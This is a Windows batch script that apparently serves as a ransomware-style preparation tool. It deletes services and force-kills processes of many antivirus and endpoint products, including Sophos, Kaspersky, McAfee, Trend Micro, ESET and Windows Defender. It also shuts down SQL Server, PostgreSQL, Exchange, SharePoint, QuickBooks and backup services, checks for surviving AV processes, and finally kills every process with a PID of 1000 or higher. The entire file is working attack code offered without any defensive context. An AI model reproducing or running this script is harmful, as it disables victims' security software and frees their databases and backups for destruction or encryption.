@echo off
rem Delite Service "Hyper-V"
sc delete "vmickvpexchange"
sc delete "vmicguestinterface"
sc delete "vmicshutdown"
sc delete "vmicheartbeat"
sc delete "vmicrdv"
sc delete "storflt"
sc delete "vmictimesync"
sc delete "vmicvss"
sc delete "hvdsvc"
sc delete "nvspwmi"
sc delete "wmms"

rem Delite Service "AVG"
sc delete "AvgAdminServer"
sc delete "AVG Antivirus"
sc delete "MBEndpointAgent"

rem Delite Service "Malwaresbytes"
sc delete "MBAMService"
sc delete "MBCloudEA"
sc delete "avgAdminClient"

rem Delite Service "Sofos"
sc delete "SAVService"
sc delete "SAVAdminService"
sc delete "Sophos AutoUpdate Service"
sc delete "Sophos Clean Service"
sc delete "Sophos Device Control Service"
sc delete "Sophos Endpoint Defense Service"
sc delete "Sophos File Scanner Service"
sc delete "Sophos Health Service"
sc delete "Sophos MCS Agent"
sc delete "Sophos MCS Client"
sc delete "SntpService"
sc delete "swc_service"
sc delete "swi_service"
sc delete "Sophos UI"
sc delete "swi_update"
sc delete "Sophos Web Control Service"
sc delete "Sophos System Protection Service"
sc delete "Sophos Safestore Service"
sc delete "hmpalertsvc"
sc delete "RpcEptMapper"
sc delete "Sophos Endpoint Defense Service"
sc delete "SophosFIM"
sc delete "swi_filter"

rem Delite Service "Fire_Bird"
sc delete "FirebirdGuardianDefaultInstance"
sc delete "FirebirdServerDefaultInstance"

rem Delite Service "SQL"
sc delete "MSSQLFDLauncher"
sc delete "MSSQLSERVER"
sc delete "SQLSERVERAGENT"
sc delete "SQLBrowser"
sc delete "SQLTELEMETRY"
sc delete "MsDtsServer130"
sc delete "SSISTELEMETRY130"
sc delete "SQLWriter"
sc delete "MSSQL$VEEAMSQL2012"
sc delete "SQLAgent$VEEAMSQL2012"
sc delete "MSSQL"
sc delete "SQLAgent"
sc delete "MSSQLServerADHelper100"
sc delete "MSSQLServerOLAPService"
sc delete "MsDtsServer100"
sc delete "ReportServer"
sc delete "SQLTELEMETRY$HL"
sc delete "TMBMServer"
sc delete "MSSQL$PROGID"
sc delete "MSSQL$WOLTERSKLUWER"
sc delete "SQLAgent$PROGID"
sc delete "SQLAgent$WOLTERSKLUWER"
sc delete "MSSQLFDLauncher$OPTIMA"
sc delete "MSSQL$OPTIMA"
sc delete "SQLAgent$OPTIMA"
sc delete "ReportServer$OPTIMA"
sc delete "msftesql$SQLEXPRESS"
sc delete "postgresql-x64-9.4"


rem Delite Service "AV: Webroot"
sc delete "WRSVC"

rem Delite Service "AV: ESET"
sc delete "ekrn"
sc delete "ekrnEpsw"

rem Delite Service "AV: Kaspersky"
sc delete "klim6"
sc delete "AVP18.0.0"
sc delete "KLIF"
sc delete "klpd"
sc delete "klflt"
sc delete "klbackupdisk"
sc delete "klbackupflt"
sc delete "klkbdflt"
sc delete "klmouflt"
sc delete "klhk"
sc delete "KSDE1.0.0"
sc delete "kltap"

rem Delite Service "AV: Quick Heal"
sc delete "ScSecSvc"
sc delete "Core Mail Protection"
sc delete "Core Scanning Server"
sc delete "Core Scanning ServerEx"
sc delete "Online Protection System"
sc delete "RepairService"
sc delete "Core Browsing Protection"
sc delete "Quick Update Service"

rem Delite Service "AV: McAfee"
sc delete "McAfeeFramework"
sc delete "macmnsvc"
sc delete "masvc"
sc delete "mfemms"
sc delete "mfevtp"

rem Delite Service "AV: Trend Micro"
sc delete "TmFilter"
sc delete "TMLWCSService"
sc delete "tmusa"
sc delete "TmPreFilter"
sc delete "TMSmartRelayService"
sc delete "TMiCRCScanService"
sc delete "VSApiNt"
sc delete "TmCCSF"
sc delete "tmlisten"
sc delete "TmProxy"
sc delete "ntrtscan"
sc delete "ofcservice"
sc delete "TmPfw"
sc delete "PccNTUpd"

rem Delite Service "AV: Panda"
sc delete "PandaAetherAgent"
sc delete "PSUAService"
sc delete "NanoServiceMain"

rem Delite Service "AV: Panda"
sc delete "EPIntegrationService"
sc delete "EPProtectedService"
sc delete "EPRedline"
sc delete "EPSecurityService"
sc delete "EPUpdateService"

rem Kill
sc delete "UniFi"

rem Kill "AV: Trend Micro"
taskkill -f -im PccNTMon.exe
taskkill -f -im NTRtScan.exe
taskkill -f -im TmListen.exe
taskkill -f -im TmCCSF.exe
taskkill -f -im TmProxy.exe
taskkill -f -im TMBMSRV.exe
taskkill -f -im TMBMSRV.exe
taskkill -f -im TmPfw.exe
taskkill -f -im CNTAoSMgr.exe
taskkill -f -im MBCloudEA.exe
taskkill -f -im MBAMService.exe



rem Kill "SQL"
taskkill -f -im sqlbrowser.exe
taskkill -f -im sqlwriter.exe
taskkill -f -im sqlservr.exe
taskkill -f -im msmdsrv.exe
taskkill -f -im MsDtsSrvr.exe
taskkill -f -im sqlceip.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im Ssms.exe
taskkill -f -im SQLAGENT.EXE
taskkill -f -im fdhost.exe
taskkill -f -im fdlauncher.exe
taskkill -f -im sqlservr.exe
taskkill -f -im ReportingServicesService.exe
taskkill -f -im msftesql.exe
taskkill -f -im pg_ctl.exe
taskkill -f -im postgres.exe

net stop MSSQLServerADHelper100
net stop MSSQL$ISARS
net stop MSSQL$MSFW
net stop SQLAgent$ISARS
net stop SQLAgent$MSFW
net stop SQLBrowser
net stop ReportServer$ISARS
net stop SQLWriter
net stop WinDefend
net stop mr2kserv
net stop MSExchangeADTopology
net stop MSExchangeFBA
net stop MSExchangeIS
net stop MSExchangeSA
net stop ShadowProtectSvc
net stop SPAdminV4
net stop SPTimerV4
net stop SPTraceV4
net stop SPUserCodeV4
net stop SPWriterV4
net stop SPSearch4
net stop MSSQLServerADHelper100
net stop IISADMIN
net stop firebirdguardiandefaultinstance
net stop ibmiasrw
net stop QBCFMonitorService
net stop QBVSS
net stop QBPOSDBServiceV12
net stop "IBM Domino Server (CProgramFilesIBMDominodata)"
net stop "IBM Domino Diagnostics (CProgramFilesIBMDomino)"
net stop IISADMIN
net stop "Simply Accounting Database Connection Manager"
net stop QuickBooksDB1
net stop QuickBooksDB2
net stop QuickBooksDB3
net stop QuickBooksDB4
net stop QuickBooksDB5


rem Kill
taskkill -f -im UniFi.exe


Echo TIME TO FIND AV

tasklist /fi "imagename eq MsMpEng.exe" | find /c "PID" && Echo Windows Defender
tasklist /fi "imagename eq MBCloudEA.exe" | find /c "PID" && Malvarebytes Endpoint Agent
tasklist /fi "imagename eq MBAMService.exe" | find /c "PID" && Malvarebytes Service
tasklist /fi "imagename eq ntrtscan.exe" | find /c "PID" && Echo Trend Micro Security
tasklist /fi "imagename eq avp.exe" | find /c "PID" && Echo Kaspersky Endpoint Security
tasklist /fi "imagename eq WRSA.exe" | find /c "PID" && Echo Webroot
tasklist /fi "imagename eq egui.exe" | find /c "PID" && Echo ESET
tasklist /fi "imagename eq AvastUI.exe" | find /c "PID" && Echo Avast


TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"